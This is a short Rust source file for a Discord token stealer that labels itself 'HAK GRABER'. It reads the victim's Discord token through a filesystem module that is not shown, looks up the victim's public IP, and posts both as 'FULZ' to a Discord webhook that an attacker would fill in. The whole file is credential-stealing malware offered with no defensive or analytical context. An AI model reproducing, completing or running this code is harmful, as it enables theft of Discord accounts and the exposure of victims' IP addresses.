use ureq;
mod filesystem;

const DISCORD_WEBHOOK_URL: &'static str = "discord_webhook_url_here";

fn send_webhook_message(message: &str) {
    let _result = ureq::post(DISCORD_WEBHOOK_URL)
        .send_form(&[("username", "HAK GRABER"), ("content", message)]);
}

fn format_token(token: &str, ip_address: &str) -> String {
    format!("HAK GRABER FULZ\nToken: {}\nIP: {}", token, ip_address)
}

fn get_ip_address() -> String {
    const API_ENDPOINT: &'static str = "https://wtfismyip.com/text";
    let result = ureq::get(API_ENDPOINT).call();
    result.into_string().unwrap()
}

fn main() {
    let ip_address = get_ip_address();
    let token = filesystem::get_discord_token();
    let fmt = format_token(&token, &ip_address);
    send_webhook_message(&fmt);
}
